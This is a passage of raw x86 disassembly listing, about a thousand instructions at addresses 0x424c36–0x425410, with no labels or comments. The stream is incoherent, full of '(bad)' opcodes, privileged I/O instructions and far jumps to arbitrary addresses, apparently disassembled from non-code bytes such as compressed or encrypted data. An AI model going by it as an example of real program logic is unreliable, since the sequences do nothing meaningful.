  424c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c37:	pop    ds
  424c38:	mov    cl,0x2
  424c3a:	test   al,dh
  424c3c:	or     al,0x27
  424c3e:	outs   dx,DWORD PTR ds:[esi]
  424c3f:	jo     0x424c4d
  424c41:	pusha  
  424c42:	push   ds
  424c43:	lahf   
  424c44:	and    eax,0x246af38e
  424c49:	das    
  424c4a:	jo     0x424c20
  424c4c:	stos   BYTE PTR es:[edi],al
  424c4d:	enter  0x4e2b,0xee
  424c51:	add    BYTE PTR [ebp-0x63],0x8f
  424c55:	std    
  424c56:	out    0xde,al
  424c58:	pop    esi
  424c59:	clc    
  424c5a:	outs   dx,BYTE PTR ds:[esi]
  424c5b:	daa    
  424c5c:	iret   
  424c5d:	pop    eax
  424c5e:	fiadd  WORD PTR [ebx-0x6431fd09]
  424c64:	cmp    eax,0xb65ece62
  424c69:	imul   ebx,DWORD PTR [ebx],0x2f8d86b0
  424c6f:	test   DWORD PTR [edi+0xfefe46],ecx
  424c75:	pop    edx
  424c76:	aaa    
  424c77:	aam    0x80
  424c79:	mov    ecx,DWORD PTR [eax]
  424c7b:	mov    ebp,esi
  424c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c7e:	ds pop ds
  424c80:	mov    BYTE PTR [edi-0x58fac4b6],dl
  424c86:	xchg   DWORD PTR [eax-0x65],esp
  424c89:	add    bh,BYTE PTR [edx+eiz*1-0x60]
  424c8d:	inc    edi
  424c8e:	and    DWORD PTR [ebx+eax*2-0x31],0x1f
  424c93:	xchg   DWORD PTR [ebx+0x35],edi
  424c96:	xchg   ecx,eax
  424c97:	f2xm1  
  424c99:	mov    DWORD PTR ds:0xdaa152d4,ecx
  424c9f:	mov    ebp,0x3ea8cba5
  424ca4:	sti    
  424ca5:	and    eax,DWORD PTR [edx]
  424ca7:	mov    edx,0x95cd6aa7
  424cac:	mov    ecx,0xb3999cd4
  424cb1:	add    eax,0x2b29375e
  424cb6:	jle    0x424c68
  424cb8:	mov    edi,0xe1c15dab
  424cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424cbe:	pop    ds
  424cbf:	jne    0x424c8d
  424cc1:	cmp    BYTE PTR [esi+edi*8-0xfa1dbcd],0xd2
  424cc9:	lds    ebx,FWORD PTR [edi-0x6f]
  424ccc:	jge    0x424c82
  424cce:	aas    
  424ccf:	lds    ecx,FWORD PTR [esi-0x6aac0287]
  424cd5:	out    0xfb,eax
  424cd7:	mov    ah,0x9c
  424cd9:	mov    edi,0x1881d728
  424cde:	stos   BYTE PTR es:[edi],al
  424cdf:	push   ebx
  424ce0:	add    BYTE PTR [ebx+0x18],bh
  424ce3:	mov    BYTE PTR [bx-0x49f],ah
  424ce8:	in     eax,dx
  424ce9:	cs ret 
  424ceb:	pushf  
  424cec:	mov    BYTE PTR [edx],0x1a
  424cef:	pop    esi
  424cf0:	jl     0x424d59
  424cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cf3:	lods   eax,DWORD PTR ds:[esi]
  424cf4:	in     al,0xb7
  424cf6:	or     BYTE PTR [ecx+0x41],0xaf
  424cfa:	lds    edx,FWORD PTR [eax-0x77]
  424cfd:	add    dh,BYTE PTR [eax+0x79a6a793]
  424d03:	mov    eax,ds:0x971f06e8
  424d08:	retf   0x7008
  424d0b:	js     0x424d72
  424d0d:	pushf  
  424d0e:	scas   al,BYTE PTR es:[edi]
  424d0f:	and    al,0xb1
  424d11:	out    0x60,eax
  424d13:	pop    edi
  424d14:	jmp    0x1f1f:0x33b53b85
  424d1b:	xor    eax,esi
  424d1d:	(bad)  [edi+0x36]
  424d20:	dec    ebp
  424d21:	jg     0x424d81
  424d23:	pop    esi
  424d24:	mov    ecx,0x7f9614f
  424d29:	sub    ecx,0xedc26551
  424d2f:	jmp    0x453a:0x54c89fe
  424d36:	xchg   edx,eax
  424d37:	mov    al,0x9
  424d39:	dec    ecx
  424d3b:	push   esp
  424d3c:	idiv   BYTE PTR [eax+eiz*2]
  424d3f:	aam    0x67
  424d41:	push   ecx
  424d42:	ss push ss
  424d44:	cmp    dh,BYTE PTR [edi-0x25]
  424d47:	adc    DWORD PTR [ecx+0x606cd40b],ecx
  424d4d:	xor    ax,0xdab0
  424d51:	add    dh,BYTE PTR [eax]
  424d53:	mov    ecx,0xbbb865ff
  424d58:	sub    BYTE PTR [ebx],ch
  424d5a:	pop    ds
  424d5b:	imul   ebx,edx,0x59
  424d5e:	push   ecx
  424d5f:	loope  0x424cff
  424d61:	inc    edi
  424d62:	into   
  424d63:	aad    0x9c
  424d65:	xchg   esi,eax
  424d66:	das    
  424d67:	inc    esi
  424d68:	stos   BYTE PTR es:[edi],al
  424d69:	mov    esi,0x69888911
  424d6e:	mov    bl,0x1b
  424d70:	daa    
  424d71:	jmp    0x56ea9ed7
  424d76:	cli    
  424d77:	sub    al,0xfd
  424d79:	add    eax,0xfb699cee
  424d7e:	aam    0x31
  424d80:	mov    DWORD PTR ds:0xdecee340,esp
  424d86:	sub    al,0xe0
  424d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d89:	add    ah,BYTE PTR [eax-0x35]
  424d8c:	push   ebp
  424d8d:	mov    ah,cl
  424d8f:	aas    
  424d90:	lock jle 0x424db1
  424d93:	and    eax,DWORD PTR [edx-0x4d]
  424d96:	loop   0x424dda
  424d98:	mov    al,ds:0x5ad5af27
  424d9d:	dec    edx
  424d9e:	jbe    0x424d79
  424da0:	(bad)  
  424da1:	mov    edi,0xb783284e
  424da6:	mov    ecx,0x9e165f5c
  424dab:	sbb    BYTE PTR [ecx-0x60],bl
  424dae:	inc    ebp
  424daf:	cmc    
  424db0:	sub    BYTE PTR [ebx],al
  424db2:	or     cl,BYTE PTR [ecx]
  424db4:	xor    DWORD PTR [ebp+0x4],0x1f081668
  424dbb:	rcl    DWORD PTR [edi+0x24],0x6
  424dbf:	adc    DWORD PTR [edi+esi*1-0x59392d1d],ebp
  424dc6:	mov    dl,0xe8
  424dc8:	lock mov esp,DWORD PTR [eax+0x1e3ff500]
  424dcf:	dec    ecx
  424dd0:	pushf  
  424dd1:	fwait
  424dd2:	retf   
  424dd3:	sub    eax,0xd701cdce
  424dd8:	adc    eax,edi
  424dda:	and    dh,BYTE PTR [ecx+ecx*2-0x4d]
  424dde:	nop
  424ddf:	jbe    0x424d9a
  424de1:	into   
  424de2:	pusha  
  424de3:	sar    ecx,0x51
  424de6:	inc    eax
  424de7:	dec    ebx
  424de8:	push   esi
  424de9:	sub    al,0x16
  424deb:	aam    0x34
  424ded:	mov    eax,0xa1ee3c0
  424df2:	hlt    
  424df3:	inc    BYTE PTR [edi-0x109fba15]
  424df9:	or     esi,edx
  424dfb:	aam    0xea
  424dfd:	stos   BYTE PTR es:[edi],al
  424dfe:	xlat   BYTE PTR ds:[ebx]
  424dff:	mov    al,bh
  424e01:	add    dl,BYTE PTR [eiz*1-0xea114fb]
  424e08:	dec    ecx
  424e09:	sub    bl,BYTE PTR [edi]
  424e0b:	or     eax,0xe4c74dc0
  424e10:	sub    BYTE PTR [esi],dl
  424e12:	mov    ebp,DWORD PTR [edx-0x3b8042dc]
  424e18:	sti    
  424e19:	or     BYTE PTR [edi+ecx*1-0x6eb07f6e],0xcf
  424e21:	sahf   
  424e22:	je     0x424e8d
  424e24:	or     BYTE PTR [ebx+0x26],0xaa
  424e28:	pop    eax
  424e29:	nop
  424e2a:	pop    ss
  424e2b:	mov    BYTE PTR [bp-0x66],dh
  424e2f:	and    DWORD PTR [edi+0x30],esi
  424e32:	pop    ds
  424e33:	mov    ebp,0xd8c8a5d3
  424e38:	adc    al,0x88
  424e3a:	stos   DWORD PTR es:[edi],eax
  424e3b:	aam    0x69
  424e3d:	push   cs
  424e3e:	retf   0x6fd6
  424e41:	jecxz  0x424e4f
  424e43:	les    esi,FWORD PTR [eax+0x9fa12bf]
  424e49:	in     eax,dx
  424e4a:	loop   0x424e92
  424e4c:	xchg   BYTE PTR [ebx-0x61a02a2f],ah
  424e52:	arpl   dx,dx
  424e54:	xchg   edi,eax
  424e55:	pop    eax
  424e56:	enter  0x8122,0x29
  424e5a:	lods   eax,DWORD PTR ds:[esi]
  424e5b:	cmp    BYTE PTR [esi+edx*4],al
  424e5e:	mov    esp,0x26edd7d4
  424e63:	call   0x819f140e
  424e68:	push   eax
  424e69:	dec    edx
  424e6a:	lahf   
  424e6b:	dec    ecx
  424e6c:	xchg   ebx,eax
  424e6d:	sbb    edx,DWORD PTR [edx+0x78]
  424e70:	mov    al,ds:0xe699e836
  424e75:	add    eax,0x8b441c12
  424e7a:	push   es
  424e7b:	jle    0x424e05
  424e7d:	xchg   edi,eax
  424e7e:	ins    BYTE PTR es:[edi],dx
  424e7f:	sub    eax,0x402fcb7
  424e84:	mov    ah,0x5
  424e86:	(bad)  
  424e87:	nop
  424e88:	push   edi
  424e89:	xchg   ebx,eax
  424e8a:	cs aad 0x8a
  424e8d:	jmp    0xb799:0x56ff9765
  424e94:	jb     0x424e58
  424e96:	je     0x424e18
  424e98:	cmp    BYTE PTR [edx],al
  424e9a:	shl    BYTE PTR ds:[esi-0x41],1
  424e9e:	xchg   ecx,eax
  424e9f:	jmp    0x8de7:0x3f1f1e57
  424ea6:	or     bh,BYTE PTR [edi-0x2a6fab4a]
  424eac:	cdq    
  424ead:	shl    DWORD PTR [ecx+eax*4+0x42],1
  424eb1:	data16 js 0x424f2d
  424eb4:	mov    BYTE PTR [ecx+0x60c5d44],dl
  424eba:	inc    ebp
  424ebb:	cmp    al,BYTE PTR gs:[ebx]
  424ebe:	les    ebp,FWORD PTR [esi+0x57]
  424ec1:	inc    esp
  424ec2:	pop    esi
  424ec3:	add    eax,DWORD PTR [ebx]
  424ec5:	push   eax
  424ec6:	pop    ds
  424ec7:	and    DWORD PTR [ebp+edi*2+0x52207beb],esi
  424ece:	jae    0x424ea5
  424ed0:	(bad)  
  424ed1:	gs dec esi
  424ed3:	pusha  
  424ed4:	mov    dh,0x9d
  424ed6:	mov    ds:0x3f5e6581,eax
  424edb:	sub    DWORD PTR [eax+0x4dee5367],ecx
  424ee1:	or     BYTE PTR [ecx+0x41],cl
  424ee4:	push   ecx
  424ee5:	add    ch,BYTE PTR [esp+edx*1]
  424ee8:	cld    
  424ee9:	mov    edx,0x328246fb
  424eee:	push   ds
  424eef:	lds    esi,FWORD PTR [eax+0x622cace1]
  424ef5:	icebp  
  424ef6:	or     eax,0xb092ded4
  424efb:	or     DWORD PTR [edi-0x757cecb9],ecx
  424f01:	stc    
  424f02:	add    eax,0x7c5895aa
  424f07:	mov    ch,0x86
  424f09:	mov    esi,0x85bc78e0
  424f0e:	cwde   
  424f0f:	leave  
  424f10:	ss pop ecx
  424f12:	xchg   ebp,eax
  424f13:	jmp    0x91235278
  424f18:	in     al,0x3a
  424f1a:	dec    ebx
  424f1b:	mov    ah,0xd5
  424f1d:	add    eax,0xd5fd6e
  424f22:	mov    ebp,ecx
  424f24:	sub    DWORD PTR [ebx],0x1e
  424f27:	adc    DWORD PTR [esi+0xf],0x73f4e627
  424f2e:	int3   
  424f2f:	stos   DWORD PTR es:[edi],eax
  424f30:	jbe    0x424f5a
  424f32:	fnsave [ebp-0x334e1d78]
  424f38:	ret    
  424f39:	mov    ah,0x7c
  424f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f3c:	leave  
  424f3d:	mov    DWORD PTR [esi],edi
  424f3f:	push   esp
  424f40:	or     eax,0xff248846
  424f45:	dec    ebx
  424f46:	push   cs
  424f47:	fwait
  424f48:	dec    eax
  424f49:	sbb    DWORD PTR [esi-0x755aaca3],0xffffffff
  424f50:	xchg   ebp,eax
  424f51:	push   DWORD PTR [edx-0x36fa701a]
  424f57:	loop   0x424f15
  424f59:	inc    edx
  424f5a:	call   0xfbb3:0x523745d5
  424f61:	clc    
  424f62:	fcom   DWORD PTR [eax+0x3604bd88]
  424f68:	cs stos DWORD PTR es:[edi],eax
  424f6a:	pop    ebx
  424f6b:	mov    ch,0x0
  424f6d:	out    0xae,al
  424f6f:	jmp    0x2265224
  424f74:	loope  0x424f16
  424f76:	sbb    eax,0x60d48f93
  424f7b:	mov    eax,ds:0x53422ffc
  424f80:	test   esi,edi
  424f82:	das    
  424f83:	pop    edx
  424f84:	xchg   si,ax
  424f86:	pop    ds
  424f87:	dec    esp
  424f88:	retf   
  424f89:	sahf   
  424f8a:	mov    al,ds:0x7f25c5f
  424f8f:	icebp  
  424f90:	mov    DWORD PTR [ecx-0xd],ecx
  424f93:	push   edx
  424f94:	ficomp WORD PTR [edx-0x11]
  424f97:	xor    edi,DWORD PTR [eax-0x5ce647ce]
  424f9d:	popa   
  424f9e:	jp     0x424f5e
  424fa0:	mov    dl,0xc3
  424fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fa3:	daa    
  424fa4:	or     DWORD PTR ds:0x9ea0bb42,ebx
  424faa:	ins    BYTE PTR es:[edi],dx
  424fab:	aam    0x3a
  424fad:	js     0x424fe8
  424faf:	retf   
  424fb0:	adc    ebx,DWORD PTR [eax*1-0x7a3c775e]
  424fb7:	ret    
  424fb8:	enter  0x1811,0x92
  424fbc:	jle    0x424fc0
  424fbe:	scas   al,BYTE PTR es:[edi]
  424fbf:	jbe    0x424ff4
  424fc1:	popa   
  424fc2:	cmp    BYTE PTR [edx],bl
  424fc4:	mov    esp,0xbab60c7
  424fc9:	aaa    
  424fca:	ret    0xc258
  424fcd:	inc    ebx
  424fce:	(bad)  
  424fcf:	(bad)  
  424fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fd1:	sbb    BYTE PTR [edx+0x78],al
  424fd4:	sahf   
  424fd5:	out    dx,al
  424fd6:	aaa    
  424fd7:	jmp    0xcec71a56
  424fdc:	mov    DWORD PTR [ebp+0x27d90a00],edi
  424fe2:	pop    ss
  424fe3:	mov    ds:0xea458dd1,eax
  424fe8:	mov    DWORD PTR [edi],eax
  424fea:	cld    
  424feb:	mov    dh,0xd8
  424fed:	xchg   edx,eax
  424fee:	adc    al,0xa5
  424ff0:	mov    fs,WORD PTR [ebx+0x71]
  424ff3:	in     eax,0xee
  424ff5:	xor    al,0x52
  424ff7:	inc    esp
  424ff8:	adc    DWORD PTR [edx+0x59],ecx
  424ffb:	ins    BYTE PTR es:[edi],dx
  424ffc:	fmul   QWORD PTR [edx]
  424ffe:	adc    eax,0x948fa89b
  425003:	or     BYTE PTR [edi+0x387a31a9],0x7d
  42500a:	outs   dx,DWORD PTR ds:[esi]
  42500b:	pop    esi
  42500c:	mov    bh,BYTE PTR [esi+ebx*1-0x11]
  425010:	pop    edi
  425011:	inc    bp
  425013:	pop    ecx
  425014:	pusha  
  425015:	mov    eax,ds:0x420bd571
  42501a:	sti    
  42501b:	pop    ebp
  42501c:	aad    0x9b
  42501e:	dec    ebp
  42501f:	bound  ecx,QWORD PTR [ecx-0x278b78df]
  425025:	sbb    DWORD PTR [ebx],ebp
  425027:	adc    ebx,0x70
  42502a:	jo     0x424fad
  42502c:	mov    DWORD PTR [eax],edi
  42502e:	stc    
  42502f:	mov    edi,0xacfdecf4
  425034:	mov    BYTE PTR ds:0x325ab681,dl
  42503a:	inc    ebx
  42503b:	pop    ebx
  42503c:	xor    al,BYTE PTR [ebx]
  42503e:	xor    bh,BYTE PTR [ebx+0x13]
  425041:	fistp  WORD PTR [edi+0x710a14fa]
  425047:	sti    
  425048:	lock sub eax,DWORD PTR [ebp+0x38400d0]
  42504f:	(bad)  
  425050:	lar    edi,WORD PTR [edx+0x3c]
  425054:	out    0xd0,eax
  425056:	shl    DWORD PTR [ebx],1
  425058:	les    eax,FWORD PTR [ebx]
  42505a:	pop    ds
  42505b:	mov    bl,0x7e
  42505d:	arpl   WORD PTR [edi-0x6b],bp
  425060:	fldenv [esi+0x6d]
  425063:	(bad)  
  425064:	xchg   ebp,eax
  425065:	add    eax,0x556442a8
  42506a:	mov    ebp,0x976dc747
  42506f:	xchg   ebx,eax
  425070:	test   al,0x1c
  425072:	imul   DWORD PTR ds:0x547200ca
  425078:	pop    eax
  425079:	lods   al,BYTE PTR ds:[esi]
  42507a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42507b:	aad    0x34
  42507d:	jmp    DWORD PTR [edi-0x3af373a0]
  425083:	pop    ss
  425084:	mov    DWORD PTR [ebp+0x3cccc8a9],esp
  42508a:	leave  
  42508b:	sub    BYTE PTR [eax+0x1ad443fe],cl
  425091:	cmp    cl,BYTE PTR [ebp-0x36]
  425094:	je     0x425031
  425096:	lea    esp,[ecx+ecx*4]
  425099:	cmc    
  42509a:	xchg   esp,eax
  42509b:	popa   
  42509c:	inc    edx
  42509d:	pop    esp
  42509e:	call   0xdb3b:0x20155c91
  4250a5:	and    eax,0x165f480
  4250aa:	retf   0x4163
  4250ad:	jne    0x4250cd
  4250af:	pop    ss
  4250b0:	mov    edi,0x5464f55d
  4250b5:	cs into 
  4250b7:	(bad)  
  4250b8:	mov    dl,0x8d
  4250ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250bb:	push   es
  4250bc:	lds    edi,FWORD PTR [edi+0x3d29149a]
  4250c2:	jg     0x425068
  4250c4:	xchg   esi,eax
  4250c5:	mov    ebp,0x357f13a
  4250ca:	dec    ecx
  4250cb:	jl     0x425079
  4250cd:	or     BYTE PTR [ebp-0x39134056],dl
  4250d3:	es js  0x4250d9
  4250d6:	pop    eax
  4250d7:	test   DWORD PTR [edx-0x7755ef4e],eax
  4250dd:	pop    ds
  4250de:	inc    ecx
  4250df:	icebp  
  4250e0:	sbb    dl,dl
  4250e2:	(bad)  
  4250e4:	jo     0x4250e9
  4250e6:	(bad)  
  4250e7:	adc    dl,cl
  4250e9:	jl     0x4250fa
  4250eb:	dec    ebx
  4250ec:	es ds xchg esp,eax
  4250ef:	or     ebx,edi
  4250f1:	add    eax,0x602326f4
  4250f6:	out    0xae,al
  4250f8:	cdq    
  4250f9:	add    eax,0x8c9f56d4
  4250fe:	adc    DWORD PTR [eax+0x259ee042],0x1cc10238
  425108:	mov    esp,0xc89103d2
  42510d:	pop    ds
  42510e:	add    al,0x6
  425110:	aad    0x11
  425112:	cmp    al,0xdb
  425114:	aas    
  425115:	aas    
  425116:	cs addr16 xchg ecx,eax
  425119:	add    al,0x66
  42511b:	aaa    
  42511c:	adc    ah,BYTE PTR [ebx+0x65bb928f]
  425122:	jae    0x4250d2
  425124:	pop    ebx
  425125:	dec    ecx
  425126:	mov    esp,0x71830926
  42512b:	out    0xaa,eax
  42512d:	in     eax,dx
  42512e:	jg     0x425125
  425130:	mov    BYTE PTR [ebx+0x5d],dl
  425133:	pusha  
  425134:	ins    DWORD PTR es:[edi],dx
  425135:	dec    edi
  425136:	push   eax
  425137:	fs or  al,0xfa
  42513a:	jo     0x425111
  42513c:	sbb    al,0x72
  42513e:	xchg   esp,eax
  42513f:	sub    eax,0xa7c7ad9c
  425144:	mov    BYTE PTR [ecx-0x3f],bl
  425147:	aaa    
  425148:	push   ebp
  425149:	ret    0xc5ee
  42514c:	inc    esi
  42514d:	add    bh,BYTE PTR [esi+0x5]
  425150:	imul   ebx,esp,0x14
  425153:	dec    esi
  425154:	std    
  425155:	sub    al,0x65
  425157:	lea    ebp,[eax-0x18]
  42515a:	push   edi
  42515b:	pop    eax
  42515c:	jecxz  0x425100
  42515e:	bound  ebx,QWORD PTR [ecx]
  425160:	retf   0x9202
  425163:	ror    DWORD PTR [edx-0x4c5c046a],1
  425169:	mov    ebx,0x2376598
  42516e:	(bad)  
  42516f:	shl    BYTE PTR [edi+0x33ae2a04],cl
  425175:	add    ebp,edx
  425177:	or     BYTE PTR [edx+0x13],bh
  42517a:	sar    dh,cl
  42517c:	jmp    0xfa4a:0x30231e77
  425183:	and    eax,0xd4cc347e
  425188:	or     DWORD PTR [ecx],ebp
  42518a:	pop    ds
  42518b:	stos   BYTE PTR es:[edi],al
  42518c:	in     eax,0x27
  42518e:	loopne 0x425155
  425190:	mov    BYTE PTR [edi-0x41ac89a4],dl
  425196:	enter  0x44e,0x88
  42519a:	popf   
  42519b:	pop    ecx
  42519c:	xchg   esp,eax
  42519d:	or     al,0x85
  42519f:	arpl   WORD PTR [ecx],cx
  4251a1:	repnz outs dx,BYTE PTR ds:[esi]
  4251a3:	inc    edi
  4251a4:	pop    esp
  4251a5:	push   0x1e
  4251a7:	cmp    eax,0xb759580c
  4251ac:	mov    dh,0x64
  4251ae:	rcl    ch,cl
  4251b0:	out    dx,al
  4251b1:	dec    esp
  4251b2:	dec    ebp
  4251b3:	jne    0x4251d9
  4251b5:	push   ecx
  4251b6:	push   DWORD PTR [eax-0x77]
  4251b9:	jne    0x425143
  4251bb:	loopne 0x42515b
  4251bd:	jge    0x4251b5
  4251bf:	sbb    ebp,esp
  4251c1:	adc    al,0x82
  4251c3:	scas   eax,DWORD PTR es:[edi]
  4251c4:	addr16 fninit 
  4251c7:	hlt    
  4251c8:	dec    ebp
  4251c9:	pop    ebx
  4251ca:	or     cl,BYTE PTR gs:[ecx+0x667d46bd]
  4251d1:	and    al,0x5c
  4251d3:	mov    ebx,DWORD PTR [ebp+eiz*1-0x24]
  4251d7:	daa    
  4251d8:	and    cl,BYTE PTR [edi-0x7928c0a1]
  4251de:	xchg   edi,eax
  4251df:	dec    edx
  4251e0:	mov    ebx,esp
  4251e2:	outs   dx,DWORD PTR ds:[esi]
  4251e3:	sub    ebx,DWORD PTR ds:0x279eb789
  4251e9:	add    bh,BYTE PTR [eax]
  4251eb:	cmp    ebp,ecx
  4251ed:	dec    ebx
  4251ee:	or     al,0xd2
  4251f0:	call   0x9f52:0x36355b85
  4251f7:	js     0x4251de
  4251f9:	xor    eax,0x3712c6c
  4251fe:	mov    ss,WORD PTR [ebx]
  425200:	leave  
  425201:	cdq    
  425202:	pushf  
  425203:	dec    ebp
  425204:	je     0x4251fc
  425206:	ins    DWORD PTR es:[edi],dx
  425207:	lds    ebx,FWORD PTR ds:0xb9f8557
  42520d:	aad    0x15
  42520f:	jecxz  0x42523b
  425211:	fstp   TBYTE PTR ds:0x9bb55e77
  425217:	aam    0xda
  425219:	ret    0x3c44
  42521c:	call   0x9c77:0x89916ebe
  425223:	mov    esi,DWORD PTR [eax]
  425225:	and    al,0x12
  425227:	xor    DWORD PTR [ebx],0x57
  42522a:	call   0x1b18:0x2c023373
  425231:	dec    esp
  425232:	cwde   
  425233:	mov    ch,0x89
  425235:	jno    0x42525d
  425237:	lods   eax,DWORD PTR ds:[esi]
  425238:	add    BYTE PTR [eax],ch
  42523a:	in     al,dx
  42523b:	pop    esp
  42523c:	cmp    ah,BYTE PTR [ebx+esi*8-0x2bfdb123]
  425243:	xlat   BYTE PTR ds:[ebx]
  425244:	mov    ecx,0xc9faa17c
  425249:	in     eax,0xf9
  42524b:	inc    esi
  42524c:	and    DWORD PTR [eax+0x65],edx
  42524f:	inc    ebp
  425250:	test   al,0x4f
  425252:	mov    ebp,0x708ad93d
  425257:	nop
  425258:	mov    DWORD PTR [ecx-0x45],edi
  42525b:	test   eax,0x282ceef9
  425260:	leave  
  425261:	adc    al,0x6a
  425263:	inc    edi
  425264:	push   esi
  425265:	cmp    BYTE PTR [ecx],ch
  425267:	(bad)  
  425268:	push   es
  425269:	mov    dh,0x8b
  42526b:	(bad)  [edx-0x77c7e315]
  425271:	sar    DWORD PTR ds:0x183e,0xd9
  425277:	jae    0x4252e4
  425279:	add    esi,edx
  42527b:	or     eax,0xb850ec1e
  425280:	ret    0x1f4c
  425283:	loope  0x4252cc
  425285:	std    
  425286:	pop    ebx
  425287:	xor    eax,0xbcdb62f2
  42528c:	test   BYTE PTR [edx+eax*4-0x74],bl
  425290:	xchg   esp,eax
  425291:	mul    BYTE PTR [eax+0x13]
  425294:	outs   dx,BYTE PTR ds:[esi]
  425295:	jae    0x425312
  425297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425298:	inc    ecx
  425299:	(bad)  
  42529a:	in     eax,0x6e
  42529c:	stos   DWORD PTR es:[edi],eax
  42529d:	xchg   ecx,eax
  42529e:	xlat   BYTE PTR ds:[ebx]
  42529f:	fimul  DWORD PTR [esi+0x10111b7d]
  4252a5:	xor    BYTE PTR [edx],0xb3
  4252a8:	call   0x2616acca
  4252ad:	mov    edx,0x778fd675
  4252b2:	or     BYTE PTR [edi],ch
  4252b4:	mov    BYTE PTR ds:0xc4afaa86,dl
  4252ba:	jl     0x425271
  4252bc:	imul   ecx,DWORD PTR [ecx+0x5a],0x469fd614
  4252c3:	int    0xf8
  4252c5:	jecxz  0x4252b6
  4252c7:	lods   al,BYTE PTR ds:[esi]
  4252c8:	retf   
  4252c9:	outs   dx,BYTE PTR ds:[esi]
  4252ca:	push   ds
  4252cb:	mov    bh,0x11
  4252cd:	add    eax,0xadfccc29
  4252d2:	imul   edx,esp,0x34
  4252d5:	jmp    0x2492a740
  4252da:	test   eax,0x76978804
  4252df:	xor    DWORD PTR [ecx+0x1a],0xffffff8a
  4252e3:	out    dx,eax
  4252e4:	mov    ch,0x27
  4252e6:	sbb    BYTE PTR [ebx],dh
  4252e8:	adc    BYTE PTR [edi],dl
  4252ea:	pop    ds
  4252eb:	(bad)  
  4252ec:	pop    edi
  4252ed:	push   esi
  4252ee:	test   BYTE PTR [eax-0x77],bh
  4252f1:	xlat   BYTE PTR ds:[ebx]
  4252f2:	and    eax,0xea70fa08
  4252f7:	lods   al,BYTE PTR ds:[esi]
  4252f8:	dec    ebp
  4252f9:	add    ah,BYTE PTR [esi+ebx*1-0x10]
  4252fd:	rcl    BYTE PTR [ecx-0x14],cl
  425300:	(bad)  
  425301:	rcr    BYTE PTR [edi],0xef
  425304:	mov    eax,0x7457484a
  425309:	mov    bh,BYTE PTR [ebp+0x3a254a11]
  42530f:	adc    BYTE PTR [ecx-0x10],cl
  425312:	lahf   
  425313:	dec    esi
  425314:	push   0x0
  425316:	clc    
  425317:	push   0x7712a589
  42531c:	popa   
  42531d:	(bad)  
  42531e:	enter  0x329e,0x6a
  425322:	push   eax
  425323:	mov    esp,ds
  425325:	add    dh,BYTE PTR [eax]
  425327:	push   eax
  425328:	in     al,0xef
  42532a:	aaa    
  42532b:	cmp    eax,edi
  42532d:	jecxz  0x425387
  42532f:	sahf   
  425330:	shl    bh,1
  425332:	fiadd  DWORD PTR [ebx]
  425334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425335:	inc    edi
  425336:	push   ds
  425337:	dec    ebx
  425338:	jp     0x425324
  42533a:	leave  
  42533b:	int    0x97
  42533d:	add    edx,DWORD PTR [edx+edi*8]
  425340:	jmp    0x425320
  425342:	adc    al,0xd5
  425344:	push   esp
  425345:	repz push 0xffffffd2
  425348:	mov    cl,dh
  42534a:	mov    cl,0x7a
  42534c:	stos   BYTE PTR es:[edi],al
  42534d:	or     eax,0x28c72a5
  425352:	pusha  
  425353:	ss mov eax,0xb415052c
  425359:	std    
  42535a:	pop    eax
  42535b:	sbb    eax,0xd89e791e
  425360:	or     ebx,eax
  425362:	fidivr DWORD PTR [esi+esi*2-0x97fc3e4]
  425369:	xchg   edi,eax
  42536a:	mov    eax,DWORD PTR [edi]
  42536c:	jp     0x425393
  42536e:	mov    eax,0x1e33e1c5
  425373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425374:	scas   al,BYTE PTR es:[edi]
  425375:	push   eax
  425376:	xchg   ebp,eax
  425377:	dec    edi
  425378:	mov    ds:0x78d56551,al
  42537d:	mov    ebp,0xa5b1e0cd
  425382:	push   0x5dc7fb4d
  425387:	aam    0xac
  425389:	jns    0x4253e9
  42538b:	call   0xd4c0fce2
  425390:	fsubr  DWORD PTR [edi+0x316931e7]
  425396:	sbb    BYTE PTR [ebx],cl
  425398:	mov    BYTE PTR ds:0xb59e9836,dh
  42539e:	dec    DWORD PTR [esi+0x48]
  4253a1:	adc    eax,0xbf509c2a
  4253a6:	js     0x425352
  4253a8:	dec    edx
  4253a9:	mov    ds:0x8f576a91,al
  4253ae:	pop    ds
  4253af:	icebp  
  4253b0:	jb     0x425357
  4253b2:	jg     0x425431
  4253b4:	(bad)  
  4253b5:	lds    edi,FWORD PTR [ebx]
  4253b7:	fwait
  4253b8:	sbb    al,0x3e
  4253ba:	cli    
  4253bb:	cmp    ebp,DWORD PTR [ebp+0x49853bf2]
  4253c1:	inc    eax
  4253c2:	pop    ecx
  4253c3:	mov    edi,0x591f6ca2
  4253c8:	jne    0x42540b
  4253ca:	adc    al,BYTE PTR [ebp-0x34]
  4253cd:	lock pop edi
  4253cf:	rol    BYTE PTR [eax],cl
  4253d1:	inc    esp
  4253d2:	inc    edi
  4253d3:	mov    bh,ah
  4253d5:	cld    
  4253d6:	iret   
  4253d7:	enter  0x9d1b,0x60
  4253db:	lds    eax,FWORD PTR [edx+0x52]
  4253de:	enter  0xece3,0xd6
  4253e2:	xchg   ebx,eax
  4253e3:	xlat   BYTE PTR ds:[ebx]
  4253e4:	jmp    0xb20d:0xc0fe2d0
  4253eb:	std    
  4253ec:	test   BYTE PTR [edx],ah
  4253ee:	push   ds
  4253ef:	gs popf 
  4253f1:	xor    al,al
  4253f3:	or     bh,BYTE PTR [edx-0x52]
  4253f6:	aam    0xd5
  4253f8:	inc    edx
  4253f9:	dec    ebp
  4253fa:	dec    edi
  4253fb:	xor    BYTE PTR [ebx-0x20],dh
  4253fe:	in     al,0x91
  425400:	mov    BYTE PTR [edi-0x600ffbd0],al
  425406:	adc    al,0x65
  425408:	add    BYTE PTR ds:0x543540ea,0x64
  42540f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425410:	loopne 0x42544f
